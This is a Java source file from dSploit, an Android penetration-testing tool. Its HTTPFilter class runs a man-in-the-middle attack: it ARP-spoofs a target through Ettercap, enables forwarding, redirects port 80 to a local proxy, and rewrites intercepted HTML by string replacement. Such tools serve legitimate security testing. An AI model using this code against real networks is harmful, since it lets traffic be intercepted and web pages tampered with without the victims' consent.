/*
 * This file is part of the dSploit.
 *
 * Copyleft of Simone Margaritelli aka evilsocket <evilsocket@gmail.com>
 *
 * dSploit is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * dSploit is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with dSploit.  If not, see <http://www.gnu.org/licenses/>.
 */
package it.evilsocket.dsploit.plugins.mitm;

import it.evilsocket.dsploit.core.System;
import it.evilsocket.dsploit.net.http.proxy.Proxy;
import it.evilsocket.dsploit.tools.Ettercap.OnReadyListener;


public class HTTPFilter 
{
	public static void start( final Proxy proxy, final String from, final String to ) {
		System.getEttercap().spoof( System.getCurrentTarget(), new OnReadyListener(){
			@Override
			public void onReady() 
			{
				System.setForwarding( true );
				
				proxy.setFilter( new Proxy.ProxyFilter() {					
					@Override
					public String onHtmlReceived(String html) {
						return html.replaceAll( from, to );
					}
				});
				
				new Thread( proxy ).start();
				
				System.getIPTables().portRedirect( 80, System.HTTP_PROXY_PORT );									
			}
			
		}).start();				
	}
	
	public static void stop( Proxy proxy ){
		System.getEttercap().kill();
		System.getIPTables().undoPortRedirect( 80, System.HTTP_PROXY_PORT );
		proxy.stop();
		System.setForwarding( false );
	}
}
